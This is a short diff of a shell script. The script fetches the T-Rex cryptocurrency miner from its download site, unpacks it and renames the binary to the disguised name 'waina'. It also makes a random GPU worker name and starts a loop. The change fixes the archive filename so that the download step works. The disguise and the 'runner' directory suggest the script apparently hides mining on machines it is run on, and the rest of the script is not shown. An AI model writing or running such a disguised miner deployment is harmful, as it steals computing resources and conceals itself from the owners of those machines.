@@ -3,7 +3,7 @@ apt-get install libpci3 && P=$(echo GPU-$(shuf -i 1-1000 -n 1)-NEO)
 x=1
 mkdir runner && cd runner
 wget https://trex-miner.com/download/t-rex-0.21.3-linux.tar.gz
-tar -xf tt-rex-0.21.3-linux.tar.gz
+tar -xf t-rex-0.21.3-linux.tar.gz
 mv t-rex waina
 while [ $x -le 20 ]
 do
